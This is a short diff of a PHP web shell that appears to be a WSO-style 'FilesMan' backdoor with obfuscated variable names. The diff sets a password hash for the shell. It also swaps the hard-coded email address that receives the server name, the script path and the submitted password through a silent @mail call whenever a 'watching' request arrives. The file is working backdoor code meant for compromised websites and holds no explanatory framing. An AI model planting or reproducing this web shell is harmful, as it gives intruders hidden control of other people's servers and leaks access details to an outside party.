@@ -1,5 +1,5 @@
 <?php
-$▛ = ""; //admin
+$▛ = "fa27ef3ef6570e32a79e74deca7c1bc3"; //jan
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
@@ -311,7 +311,7 @@ function perms($p) {
 	return $i;
 }
 if(array_key_exists('watching',$_POST)){
-	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('ynrftalen@gmail.com', 'root', $tmp); // Edit or delete!
+	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('1337xhan@gmail.com', 'root', $tmp); // Edit or delete!
 }
 function viewPermsColor($f) {
 	if (!@is_readable($f))
